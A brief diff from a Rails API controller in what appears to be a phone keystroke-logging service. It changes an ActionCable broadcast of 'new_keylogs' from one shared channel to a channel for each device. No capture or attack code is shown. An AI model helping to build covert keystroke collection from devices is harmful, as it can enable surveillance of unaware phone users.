@@ -40,7 +40,7 @@ module Api
       }, expires_in: 24.hours)
 
       # Push real-time update to dashboard via ActionCable
-      ActionCable.server.broadcast("keylog_stream", {
+      ActionCable.server.broadcast("keylog_stream_#{device_id}", {
         type: 'new_keylogs',
         device_id: device_id,
         device_name: smartphone.name,
